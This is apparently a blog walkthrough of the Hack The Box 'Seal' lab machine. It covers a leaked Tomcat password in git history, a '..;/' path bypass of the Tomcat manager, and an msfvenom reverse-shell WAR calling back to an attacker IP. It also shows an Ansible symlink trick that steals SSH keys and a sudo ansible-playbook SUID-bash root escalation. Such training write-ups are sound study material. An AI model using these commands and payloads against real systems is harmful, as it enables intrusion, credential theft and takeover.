---
title: "HTB: Seal"
date: 2023-10-15
draft: false
os: "Linux"
difficulty: "Medium"
platform: "HTB"
aliases: ["/posts/htb/seal/"]
tags:
  - htb
  - medium
  - linux
  - tomcat
  - 403-bypass
  - gitbucket
  - ansible
  - symlink
categories:
  - walkthrough
---

{{< box-info name="Seal" os="Linux" difficulty="Medium" ip="10.129.95.190" platform="HTB" >}}

---

## Enumeration

### Nmap

{{< collapse title="Nmap output" >}}
```
PORT     STATE SERVICE
22/tcp   open  ssh
443/tcp  open  https
8080/tcp open  http-proxy
```
{{< /collapse >}}

### Port 8080 - GitBucket

A GitBucket instance with open registration. After registering, we get access to repository info and commit history.

Digging through the commits reveals Tomcat credentials:

```xml
<user username="tomcat" password="42MrHBf*z8{Z%" roles="manager-gui,admin-gui"/>
```

### Port 443 - Web App + Tomcat

Directory fuzzing reveals the standard Tomcat management endpoints (`/manager`, `/admin`), but they return 403.

---

## Foothold

### Tomcat 403 Bypass

The Tomcat manager console at `/manager/html` is blocked with 403. However, there's a well-known path normalization bypass (credit to Orange Tsai):

```
https://seal.htb/manager/html    --> 403
https://seal.htb/manager..;/html --> 200
```

With access to the Tomcat manager, deploy a WAR reverse shell:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.X LPORT=1234 -f war > shell.war
```

Upload, deploy, trigger -- we get a shell as `tomcat`.

---

## Lateral Movement

### Symlink + Ansible Backup

The target user is `luis`. Poking around reveals an Ansible playbook at `/opt/backups/playbook/run.yml`:

```yaml
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize:
      src: /var/lib/tomcat9/webapps/ROOT/admin/dashboard
      dest: /opt/backups/files
      copy_links: yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
```

Key detail: `copy_links=yes` means the synchronize task follows symlinks. And we have write access to the `uploads` directory within the dashboard path.

Create a symlink pointing to luis's home directory:

```bash
ln -s /home/luis /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads
```

Wait for the next backup run, then grab the archive from `/opt/backups/archives/`. It now contains luis's entire home directory, including SSH keys.

SSH in as `luis`.

---

## Privilege Escalation

### Ansible Playbook as Root

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/ansible-playbook *
```

Create a malicious playbook that copies bash and sets the SUID bit:

```yaml
- hosts: localhost
  tasks:
  - name: copy bash to user folder
    command: cp /bin/bash /home/luis/
    become: yes
    become_user: root
  - name: creating SUID
    command: chmod u+s /home/luis/bash
    become: yes
    become_user: root
```

```bash
sudo /usr/bin/ansible-playbook pwn.yml
./bash -p
# root
```

---

## Proof

{{< terminal title="root@seal" >}}
user.txt: [redacted]
root.txt: [redacted]
{{< /terminal >}}

---

## Key Takeaways

{{< callout type="note" >}}
- Always check Git history for leaked credentials -- commit logs don't lie
- Tomcat path normalization bypass (`..;/`) is a classic technique worth remembering
- Ansible `synchronize` with `copy_links=yes` is exploitable if you can plant symlinks in the source directory
- `ansible-playbook` with sudo is essentially unrestricted root command execution
{{< /callout >}}
